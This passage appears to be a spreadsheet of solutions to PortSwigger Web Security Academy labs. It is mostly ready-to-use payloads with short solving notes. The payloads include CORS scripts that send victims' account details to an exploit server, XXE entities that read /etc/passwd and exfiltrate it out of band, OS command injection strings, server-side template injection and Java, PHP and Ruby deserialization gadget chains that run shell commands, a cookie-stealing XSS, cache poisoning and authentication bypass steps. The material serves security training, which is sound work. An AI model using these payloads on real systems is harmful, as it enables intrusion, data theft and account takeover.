the victim's browser has the poisoned cookie saved, loading the home 
page will cause the payload to execute.","DOM-Based, Practitioner"
64,CORS vulnerability with basic origin reflection,"<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>","Insecure CORS config that trusts all origins.
Access-Control-Allow-Credentials
Origin is reflected in the origin is reflected in the Access-Control-Allow-Originheader.","Apprentice, CORS"
65,CORS vulnerability with trusted null origin,"<iframe sandbox=""allow-scripts allow-top-navigation allow-forms"" srcdoc=""<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>""></iframe>","Access-Control-Allow-Credentials
 header.
Origin: null. Add this header and observer that the ‘null’ origin is reflected in the Access-Control-Allow-Origin header.","Apprentice, CORS"
66,CORS vulnerability with trusted insecure protocols,"<script>
    document.location=""http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1""
</script>","added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
Observe that the origin is reflected in the https://portswigger.net/web-security/cors/access-control-allow-origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
productID parameter is vulnerable to XSS. This is seen when clicking ‘Check stock’, and it is loaded on a HTTP URL subdomain.","CORS, Practitioner"
67,Exploiting XXE using external entities to retrieve files,"<!DOCTYPE test [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""file:///etc/passwd""> ]>","""Check stock"" feature that parses XML input and returns any unexpected values in the response.
Insert external entity definition in between the XML declaration and the stockCheck
 element.

Replace the productId number with a reference to the external entity: &xxe;","Apprentice, XXE"
68,Exploiting XXE to perform SSRF attacks,"<!DOCTYPE test [ <!ENTITY xxe SYSTEM ""http://169.254.169.254/""> ]>","""Check stock"" feature that parses XML input and returns any unexpected values in the response.
Iteratively update the URL in the DTD to explore the API until you reach /latest/meta-data/iam/security-credentials/admin
. This should return JSON containing the SecretAccessKey.","Apprentice, XXE"
69,Blind XXE with out-of-band interaction,"<!DOCTYPE stockCheck [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""http://BURP-COLLABORATOR-SUBDOMAIN""> ]>","""Check stock"" feature that parses XML input but does not display the result.

Replace productId number with a reference to the external entity: &xxe;","Practitioner, XXE"
70,Blind XXE with out-of-band interaction via XML parameter entities,"<!DOCTYPE stockCheck [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""http://BURP-COLLABORATOR-SUBDOMAIN""> %xxe; ]>","""Check stock"" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.","Practitioner, XXE"
71,Exploiting blind XXE to exfiltrate data using a malicious external DTD,"<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % eval ""<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>"">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""YOUR-DTD-URL""> %xxe;]>","Save first command in Exploit Server.

Second XXE payload will then access the XXE in the exploit server and call out to the Burp Collaborator.","Practitioner, Review, XXE"
72,Exploiting blind XXE to retrieve data via error messages,"<!ENTITY % file SYSTEM ""file:///etc/passwd"">
<!ENTITY % eval ""<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"">
%eval;
%exfil;

<!DOCTYPE foo [<!ENTITY % https://portswigger.net/web-security/xxe SYSTEM ""YOUR-DTD-URL""> %xxe;]>",Error message will have the contents of the /etc/passwd file,"Practitioner, XXE"
73,Exploiting XInclude to retrieve files,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include parse=""text"" href=""file:///etc/passwd""/></foo>","Don't control the entire XML document you can't define a DTD to launch a classic https://portswigger.net/web-security/xxe
 attack.

Use XInclude statement to retrieve the contents of the /etc/passwd file","Practitioner, XXE"
74,Exploiting XXE via image file upload,"<?xml version=""1.0"" standalone=""yes""?><!DOCTYPE test [ <!ENTITY https://portswigger.net/web-security/xxe SYSTEM ""file:///etc/hostname"" > ]><svg width=""128px"" height=""128px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1""><text font-size=""16"" x=""0"" y=""16"">&xxe;</text></svg>","SVG image format uses XML.

Create SVG file with the payload content. Upload the image as an avatar and post a comment. The /etc/hostname file should be in the image.","Practitioner, XXE"
,,,,XXE
,,,,XXE
75,Basic SSRF against the local server,"http://localhost/admin

http://localhost/admin/delete?username=carlos","/admin is blocked.

Use check stock feature, change the stockApi parameter to access admin interface.

stockApi is a website URL e.g. http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1","Apprentice, SSRF"
76,Basic SSRF against another back-end system,http://192.168.0.1:8080/admin,"change the stockApi
 parameter to http://192.168.0.1:8080/admin
 then highlight the final octet of the IP address (the number 1
), click ""Add §"".

Use Intruder and set the payloads to iterate up by 1.

Use the status column to sort and identify which IP address has an internal service running on it.","Apprentice, SSRF"
77,SSRF with blacklist-based input filter,"http://127.1/

http://127.1/admin

Double URL encode to bypass","Use double URL encoding to bypass, this can be done just on the ‘a’ character.","Practitioner, SSRF"
78,SSRF with filter bypass via open redirection vulnerability,"/product/nextProduct?path=http://192.168.0.12:8080/admin

stockApi=%2fproduct%2fnextProduct%3fpath%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin","the path
 parameter is placed into the Location header of a redirection response, resulting in an open redirection. You can use this to redirect the stockApi checker to the internal admin page service","Practitioner, Review, SSRF"
79,Blind SSRF with out-of-band detection,Insert Collaborator payload into Referer header,"Select the Referer header, right-click and select ""Insert Collaborator Payload"" to replace the original domain with a Burp Collaborator generated domain. Send the request.","Practitioner, SSRF"
80,"OS command injection, simple case",productId=1&storeId=1|whoami,"StoreId parameter, use the | to split the statement and then inject a new command.","Apprentice, OS Command Injection"
81,Blind OS command injection with time delays,email=x||ping+-c+10+127.0.0.1||,Requests to the feedback form,"OS Command Injection, Practitioner"
82,Blind OS command injection with output redirection,email=||whoami>/var/www/images/output.txt||,"To check, intercept a request that loads an image of a product and modify the filename parameter so that it matches the name of the output file

filename=output.txt","OS Command Injection, Practitioner"
83,Blind OS command injection with out-of-band interaction,email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||,Simply testing for a DNS lookup,"OS Command Injection, Practitioner"
84,Blind OS command injection with out-of-band data exfiltration,email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||,Adding a command to the output in Burp Collaborator,"OS Command Injection, Practitioner"
85,Basic server-side template injection,"https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system(""rm+/home/carlos/morale.txt"")+%25>

https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>","GET request uses the message parameter to render “unfortunately this product is out of stock”

Location: /?message=Unfortunately this product is out of stock

Note that this is rendered on the page itself when you click on “view details” for the first product.

ERB documentation, discover that the syntax <%= someExpression %>
 is used to evaluate an expression and render the result on the page.

Key here is that the message parameter in the URL is rendering directly onto the page. So test these for SSTI injections, make sure to URL encode the payload","Practitioner, SSTI"
86,Basic server-side template injection (code context),"blog-post-author-display=user.name}}{{7*7}}

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')","Prefered name parameter makes a request POST /my-account/change-blog-post-author-display

parameters:

blog-post-author-display=user.first_name&csrf=u55IaRymLHNocS15YKaCF42Za2jok2Vg

This shows in a comment, so post a test comment and reload the page with the comments in to see the result of the injection.","Practitioner, SSTI"
87,Server-side template injection using documentation,"<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""rm /home/carlos/morale.txt"") }",,"Practitioner, SSTI"
88,Server-side template injection in an unknown language with a documented exploit,https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d,"Search the web for ""Handlebars server-side template injection"". You should find a well-known exploit posted by @Zombiehelp54

You find this by fuzzing the message parameter with various strings. e.g.

${{<%[%'""}}%\

The error message will return invalid syntax, which identifies the website is using handlebars","Practitioner, SSTI"
89,Server-side template injection with information disclosure via user-supplied objects,"{% debug %}

{{settings.SECRET_KEY}}","fuzz string ${{<%[%'""}}%\
, and save the template. The error message in the output hints that the Django framework is being used.

Debug first, then notice settings object is accessible. In the Django documentation, there is a SECRET_KEY property.","Practitioner, Review, SSTI"
90,"File path traversal, simple case",../../../etc/passwd,"filename parameter when fetching a product image.

GET /image?filename=29.jpg","Apprentice, Directory Traversal"
91,"File path traversal, traversal sequences blocked with absolute path bypass",/etc/passwd,"the traversal above doesn’t work, but using the absolute path does work.","Directory Traversal, Practitioner"
92,"File path traversal, traversal sequences stripped non-recursively",....//....//....//etc/passwd,extra characters to bypass stripping of characters,"Directory Traversal, Practitioner"
93,"File path traversal, traversal sequences stripped with superfluous URL-decode",..%252f..%252f..%252fetc/passwd,"URL encoding to bypass filter, characters will be URL-decoded and processed","Directory Traversal, Practitioner"
94,"File path traversal, validation of start of path",/var/www/images/../../../etc/passwd,"application is validating the start of the path, but then you can recursively go back from there","Directory Traversal, Practitioner"
95,"File path traversal, validation of file extension with null byte bypass",../../../etc/passwd%00.png,"validates that the filename ends with the expected file extension, this can be bypassed with the null byte","Directory Traversal, Practitioner"
96,Unprotected admin functionality,/administrator-panel,"Browse robots.txt to identify the path to the admin panel, then browse directly to it.","Access Control, Apprentice"
97,Unprotected admin functionality with unpredictable URL,/admin-uofisu,Admin panel URL is disclosed in the JavaScript. You can see this in the Burp Suite sitemap,"Access Control, Apprentice"
98,User role controlled by request parameter,Cookie change Admin=true,"Intercept request when logging in, note that the response sets a cookie Admin=false. Change the cookie to Admin=true and access the admin panel.","Access Control, Apprentice"
99,User role can be modified in user profile,"Add JSON roleid: 2 to request body

{""mailto:email%22:%22test@test.com"",
""roleid"":2
}","Response contains the roleid when using the function to change the email address. Add roleid: 2 into the JSON of the request body.

POST /my-account/change-email
{""mailto:email%22:%22test@test.com""}

Update this to {""mailto:email%22:%22test@test.com"",
""roleid"":2
}","Access Control, Apprentice"
100,User ID controlled by request parameter,"Modify id parameter to another user account

/my-account?id=carlos","URL when requesting account details contains the username parameter.

/my-account?id=carlos","Access Control, Apprentice"
101,"User ID controlled by request parameter, with unpredictable user IDs","Modify id parameter to the GUID of another user account

/my-account?id=d5bb1375-b369-4d7a-831b-29f7def78246","Identify the GUID of the other account by viewing the post authors, this has a link to view all the blogs written by that user and discloses the GUID of that user account.

blogs?userId=d5bb1375-b369-4d7a-831b-29f7def78246","Access Control, Apprentice"
102,User ID controlled by request parameter with data leakage in redirect,"/my-account?id=carlos

Changing the URL parameter causes a redirect to home, but the information is still disclosed in the response body.","The page redirects you when trying to access a different account back to the home page. However, the information of the account you are trying to access is still disclosed in the body of the response before the redirection takes place.","Access Control, Apprentice"
103,User ID controlled by request parameter with password disclosure,"/my-account?id=administrator

View the response body and identify that the password is disclosed.","User account page contains the existing password, when trying to access another account based on the id parameter the password is hidden in the UI, but revealed in the response body","Access Control, Apprentice"
104,Insecure direct object references,/download-transcript/1.txt,"transcripts are saved as text files, changing the filename of the transcript being requested will give access to the other transcripts","Access Control, Apprentice"
105,URL-based access control can be circumvented,X-Original-URL: /admin,"The response when being blocked from accessing /admin is very plain, this could indicate it is from a front-end system.

X-Original-URL: /tester

adding this header returns ‘not found’ which indicates this was processed by the back-end system","Access Control, Practitioner"
106,Method-based access control can be circumvented,Right click and change request method from GET to POST,Circumvent access control on POST request by using GET requests that include the parameters directly within the URL.,"Access Control, Practitioner, Review"
107,Multi-step process with no access control on one step,"Perform an administrative action with a non-admin user, identify the action first with an admin account, but note there is no restriction on the action itself.","Some steps that should be locked to admins only are not properly checking. Some applications will assume that administrative functions are only accessed by admin users, but there are no checks on the administrative actions themselves that the account making the requests have admin privileges.

log in as an admin
see there is an administrative action to promote a different account
copy the request made when promoting an account
perform this action as a low-priv user","Access Control, Practitioner"
108,Referer-based access control,"/admin-roles?username=wiener&action=upgrade

Include the Referer header

Referer: https://0a60006403004af0c086277400cb001c.web-security-academy.net/admin","Directly performing an administrative action can sometimes be blocked unless the referer header is showing it came from the previous admin page.

Manually adding the Referer header can circumvent this.","Access Control, Practitioner"
109,Username enumeration via different responses,"username=§invalid-username§

username=identified-user&password=§invalid-password§","Use Intruder Sniper attack, start with the username and note that the responses for an invalid username and incorrect password are different which allows for username enumeration.

Then repeat the process with the valid username to identify the correct password.","Apprentice, Authentication"
110,2FA simple bypass,/my-account manually change the URL to bypass the 2FA verification,"The 2FA prompt is shown, but is not actually required to access account settings. So browsing directly to the account settings page can bypass this control. You can identify the URL for the account settings page by logging in yourself first and seeing the flow of the application.","Apprentice, Authentication"
111,Password reset broken logic,"POST /forgot-password?temp-forgot-password-token

temp-forgot-password-token=Zl8C2ANa5SONp149RSSoISCRfGNLQGTF&username=carlos&new-password-1=test&new-password-2=test","Token is not being checked, as this can be deleted or reused and the reset functionality still works.

Generate a new password request and change the username to carlos, then note that this changes the password for a different account.","Apprentice, Authentication"
112,Username enumeration via subtly different responses,username=identified-user&password=§invalid-password§,"Error message Invalid username or password.

Error message for a successful username but invalid password is subtly different and has a typo with a trailing space. You can notice this slight difference in response length to determine a correct password.

Use Intruder, and in the Options tab under Grep-Extract you can add a new extraction specifically for the error message, this will add this as a new column in the output to identify the slight difference.","Authentication, Practitioner"
113,Username enumeration via response timing,username=identified-user&password=§invalid-password§,"X-Forwarded-For header is supported which can allow you to spoof the IP address.

For this lab, when you enter a valid username the response time is varied based on the length of the password entered.

Use Intruder and set the password payload to a long string (100 characters or more). Then view the response received column to identify the different response times.","Authentication, Practitioner"
114,"Broken brute-force protection, IP block",,"IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.

Add a list of payloads that alternates between your username and carlos
. Make sure that your username is first and that carlos
 is repeated at least 100 times. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.

For this lab, ensure that the number of threads is set to 1 so that requests happen one by one.","Authentication, Practitioner"
115,Username enumeration via account lock,username=§invalid-username§&password=example§§,"Use Cluster Bomb attack to generate 5 incorrect payloads for each username. One of the usernames will return a message that too many incorrect login attempts have been made (locked out).

Start another Intruder attack, use a Grep-Extract rule on the error message and note that one of the passwords does not return an error message. This is the correct password and can be used to login once the account is reset.","Authentication, Practitioner"
116,2FA broken logic,"POST /login2

Modify verify parameter to carlos and add payload to the mfa-code parameter in Intruder to brute force the verification code","You have to first make a GET request to login2 with Carlos so that a 2FA code is generated for his account.

Then make a POST request to login2 with your own account, but modify the parameters for Carlos and then brute force the mfa-code for his account using Intruder.","Authentication, Practitioner"
117,Brute-forcing a stay-logged-in cookie,,,"Authentication, Practitioner"
118,Offline password cracking,"<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

Obtain the cookie, then crack this offline using a search engine or similar tool.","stay-logged-in cookie:
username+':'+md5HashOfPassword

Steal victim cookie using a stored XXS payload","Authentication, Practitioner"
119,Password reset poisoning via middleware,"X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

temp-forgot-password-token modify to the one received when submitting the request, change username to carlos.","The X-Forwarded-Host header points the dynamically generated reset link to an arbitrary domain. Change the domain to the exploit server with the username carlos, then obtain the password reset link with the token as a query parameter. Note that this one points to the exploit server, so the link itself is invalid but the token is not.

Generate a new, valid password reset link and replace the token value with the previously obtained one.","Authentication, Practitioner, Review"
120,Password brute-force via password change,username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc,"During password reset, if you enter two different new passwords, an error message simply states Current password is incorrect
. If you enter a valid current password, but two different new passwords, the message says New passwords do not match
. We can use this message to enumerate correct passwords.

Use Intruder and add a grep-match rule to flag responses that say “New passwords do not match”. This is because the error message indicates that the current password is correct, so this password can be used to login to the application.","Authentication, Practitioner"
121,Manipulating WebSocket messages to exploit vulnerabilities,<img src=1 onerror='alert(1)'>,"Access the WebSockets history tab in Burp.

Intercept the websocket message with Burp, ensure this is configured in Burp settings","Apprentice, Websockets"
122,Manipulating the WebSocket handshake to exploit vulnerabilities,"<img src=1 oNeRrOr=alert`1`>

X-Forwarded-For: 1.1.1.1",Adding the X-Forwarded-For header can bypass IP address blocking,"Practitioner, Websockets"
123,Cross-site WebSocket hijacking,"<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send(""READY"");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>","The WebSockets READY command retrieves past chat messages from the server. This request has no CSRF tokens.

Exploit is sending this READY message via websocket, to then fetch the past chat messages of the victim account.","Practitioner, Websockets"
124,Web cache poisoning with an unkeyed header,"alert(document.cookie) (in the body of the exploit server file name, change the file name to match the path of the request to /resources/js/tracking.js

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

Replay the request until the cahce is poisoned and the X-Cache response in the header returns “hit”.","When a header is what is causing a cache update

add cache buster query parameter such as ?cb=1234 to the home page GET request.

Add X-Forwarded-Host
 header with an arbitrary hostname. This hostname generates an absolute URL stored at /resources/js/tracking.js

Observe X-Cache response to determine if the response came from the cache or not.","Practitioner, Web Cache Poisoning"
125,Web cache poisoning with an unkeyed cookie,"fehost=someString""-alert(1)-""someString","When cookies aren’t included in the cache key.

First response to the application returns the following cookie: fehost=prod-cache-01 This cookie is reflected in a double-quoted JavaScript response.","Practitioner, Web Cache Poisoning"
126,Web cache poisoning with multiple headers,"alert(document.cookie) (in exploit server)

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

X-Forwarded-Scheme - anything other than HTTPS","X-Forwarded-Scheme
 header with any value other than https results in a 302 response, Location header shows that you are being redirected to the URL using https.

Add the X-Forwarded-Host: example.com
 header back to the request, but keep X-Forwarded-Scheme: nothttps

Location
 header of the 302 redirect now points to https://example.com/","Practitioner, Web Cache Poisoning"
127,Targeted web cache poisoning using an unknown header,"X-Host

alert(document.cookie) (in exploit server)

X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

In comment of a blog post:

<img src=""https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo"" />","Use Param Miner to guess headers.

the Vary
 header is used to specify that the User-Agent
 is part of the cache key. To target the victim, you need to find out their User-Agent.

Obtain User-Agent via XSS and then paste the victims user-agent into the header and remove cache buster to poison","Practitioner, Web Cache Poisoning"
128,Web cache poisoning via an unkeyed query string,GET /?evil='/><script>alert(1)</script>,"Use Origin header as a cache buster, add this to your request.","Practitioner, Web Cache Poisoning"
129,Web cache poisoning via an unkeyed query parameter,GET /?utm_content='/><script>alert(1)</script>,"Use Param Miner to identify that utm_content is supported as a parameter. Note this is unkeyed if you add it to your query string and still get a cache hit, it is also reflected in the response.

Add a different query parameter to work as a cache buster.","Practitioner, Web Cache Poisoning"
130,Parameter cloaking,GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1),"utm_content
 parameter is supported and also excluded from the cache key.

If you add a semicolon it is treated as a single parameter and is therefore also excluded from the cache key. Identified with Param Miner loaded, right-click on the request and select ""Bulk scan"" > ""Rails parameter cloaking scan”

GET /js/geolocate.js?callback=setCountryCookie

you can control the name of the function that is called on the returned data by editing the callback
 parameter but it is keyed. Add a second callback parameter to the utm_content, it’s not keyed.

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({""country"" : ""United Kingdom""})","Practitioner, Web Cache Poisoning"
131,Web cache poisoning via a fat GET request,"GET /js/geolocate.js?callback=setCountryCookie
…
callback=alert(1)","GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({""country"" : ""United Kingdom""})

Add a second callback parameter to the body, cache key still derived from the original callback parameter.","Practitioner, Web Cache Poisoning"
132,URL normalization,GET /random</p><script>alert(1)</script><p>foo,"the path requested is reflected in the error message, /random doesn’t exist.

when loaded directly, it doesn’t alert due to URL-encoding. But when poisoned and loaded, the browsers  encoded payload was URL-decoded by the cache.","Practitioner, Web Cache Poisoning"
133,Modifying serialized objects,"Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin
 attribute to b:1
. Click ""Apply changes"". The modified object will automatically be re-encoded and updated in the request.","Session cookie is URL and base64 encoded.

It is a serialized PHP object. admin attribute contains b:0 for false.

","Apprentice, Insecure Deserialization"
134,Modifying serialized data types,"O:4:""User"":2:{s:8:""username"";s:13:""administrator"";s:12:""access_token"";i:0;}","Update the length of the username attribute to 13.
                            
Change the username to administrator.
                            
Change the access token to the integer 0. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
                            
Update the data type label for the access token by replacing s with i.","Insecure Deserialization, Practitioner"
135,Using application functionality to exploit insecure deserialization,"s:11:""avatar_link"";s:23:""/home/carlos/morale.txt""","The cookie has a serialized object avatar_link attribute, which points to your avatar via file path. This is when the account is deleted.

Modify this path to point to /home/carlos/morale.txt

Remember to update the length indicator","Insecure Deserialization, Practitioner"
136,Arbitrary object injection in PHP,"O:14:""CustomTemplate"":1:{s:14:""lock_file_path"";s:23:""/home/carlos/morale.txt"";}","/libs/CustomTemplate.php referenced. You can read the source code of this file by appending the ~ character to the filename.

CustomTemplate class contains the destruct() magic method, which invokes unlink() on the lockfile_path attribute.

Base64 and URL encode the payload, then add this as a session cookie.

Session cookie looks like originally:

O:4:""User"":2:{s:8:""username"";s:6:""wiener"";s:12:""access_token"";s:32:""olt9dugduro0pn89dvad0ckshsxn5ad7"";}

(after URL and base64 decode)","Insecure Deserialization, Practitioner"
137,Exploiting Java deserialization with Apache Commons,java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64,"Replace session cookie with the output of ysoserial, then URL-encode it.

Session cookie looks like originally:

¬í�sr�/lab.actions.common.serializable.AccessTokenUserQüå'©�L�accessTokent�Ljava/lang/String;L�usernameq�~�xpt� o3nsmfykon6aoe1st16bub2f8pc02yqht�wiener

(after URL and base64 decode)","Insecure Deserialization, Practitioner"
138,Exploiting PHP deserialization with a pre-built gadget chain,"./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64

Generate payload object

<?php
$object = ""OBJECT-GENERATED-BY-PHPGGC"";
$secretKey = ""LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"";
$cookie = urlencode('{""token"":""' . $object . '"",""sig_hmac_sha1"":""' . hash_hmac('sha1', $object, $secretKey) . '""}');
echo $cookie;

This is the script to generate a signed payload","A developer comment discloses /cgi-bin/phpinfo.php and an error message discloses Symfony 4.3.6 framework in use.

PHPinfo discloses the secret key, which is used to sign the payload.

Cookie looks like

{""token"":""Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpaDQzZDVsdjZtZnkwNHFydmttMnh4MmI4ZWc1c216MSI7fQ=="",""sig_hmac_sha1"":""63efd6d03ee265f6d3d19d563d760354f166ea13""}
(When URL decoded)

When token base64 decoded:

{""token"":""O:4:""User"":2:{s:8:""username"";s:6:""wiener"";s:12:""access_token"";s:32:""ih43d5lv6mfy04qrvkm2xx2b8eg5smz1"";}"",""sig_hmac_sha1"":""63efd6d03ee265f6d3d19d563d760354f166ea13""}","Insecure Deserialization, Practitioner"
139,Exploiting Ruby deserialization using a documented gadget chain,"Change the command that should be executed from id to rm /home/carlos/morale.txt.
                            
Replace the final two lines with puts Base64.encode64(payload). This ensures that the payload is output in the correct format for you to use for the lab.","find the Universal Deserialisation Gadget for Ruby 2.x-3.x
 by vakzz
 on devcraft.io.

Copy the final script for generating the payload.

Make the necessary changes, run the script and URL-encode the output.

Cookie base64 decoded looks like:
o:	User:@usernameI""wiener:EF:@access_tokenI""%l6gf3l4x5vn6il694569c3qioft4f5o0;F","Insecure Deserialization, Practitioner"
140,Information disclosure in error messages,"GET /product?productId=""example""","The unexpected data type causes an exception, and a full stack trace is displayed in the response. This reveals that the lab is using Apache Struts 2 2.3.31.","Apprentice, Information Disclosure"
141,Information disclosure on debug page,/cgi-bin/phpinfo.php,Use Engagement Tools > Find Comments. This will identify interesting HTML comments.,"Apprentice, Information Disclosure"
142,Source code disclosure via backup files,/backup/ProductTemplate.java.bak,"/robots.txt
 and notice that it reveals the existence of a /backup directory. Browse to /backup to find the file ProductTemplate.java.bak

Or, ""Engagement tools"" > ""Discover content"". Then, launch a content discovery session to discover the /backupdirectory and its contents.","Apprentice, Information Disclosure"
143,Authentication bypass via information disclosure,"TRACE /admin

X-Custom-IP-Authorization: 127.0.0.1","""Proxy"" > ""Options"", scroll down to the ""Match and Replace"" section, and click ""Add"". Leave the match condition blank, but in the ""Replace"" field, enter:X-Custom-IP-Authorization: 127.0.0.1","Apprentice, Information Disclosure"
144,Information disclosure in version control history,"wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/

admin.conf",,"Information Disclosure, Practitioner"
145,Excessive trust in client-side controls,"POST /cart

Change price parameter to an arbitrary value when adding a product to the cart.","There is a logic flaw in the purchasing workflow to buy items for an unintended price.

The application is relying on the client side value and not checking this when it is submitted to the server.","Apprentice, Business Logic Vulnerabilities"
146,High-level logic vulnerability,"POST /cart

change the quantity parameter to negative values to reduce the price of the cart.","Change the quantity parameter to a negative value, this lowers the price of the cart.

Add the leather jacket to the cart, then add negative quantities of another product to lower the price of the cart.","Apprentice, Business Logic Vulnerabilities"
147,Inconsistent security controls,"Only “@dontwannacry” users can access /admin

Register with an email address

anything@your-email-id.web-security-academy.net

Go to account and change email to anything@dontwannacry","The /admin endpoint is locked to specific users with an email domain. You can’t sign up with an email address at this domain as you won’t have access to the @dontwannacry email domain.

However, you can register with a normal email address and then change your email address in the account settings.","Apprentice, Business Logic Vulnerabilities"
148,Flawed enforcement of business rules,"Coupons NEWCUST5 and SIGNUP30

Adding the same coupon twice in a row is rejected, but adding the coupons in alternate order will bypass this control","Alternating between two different coupon codes will provide infinite money.

The intended control is to prevent the same coupon from being added multiple times, but this does not apply when 2 (or more) coupons are used in alternate.","Apprentice, Business Logic Vulnerabilities"
149,Low-level logic flaw,"POST /cart

Use Intruder to rapidly increase the price, once the cart reaches the maximium limit it switches to a negative interger and start counting toward 0.

Use Intruder and Repeater to make the cart value between 0 and 100 dollars to purchase",Note that you need to use other items other than just the jacket to have the price land between 0 and 100.,"Business Logic Vulnerabilities, Practitioner"
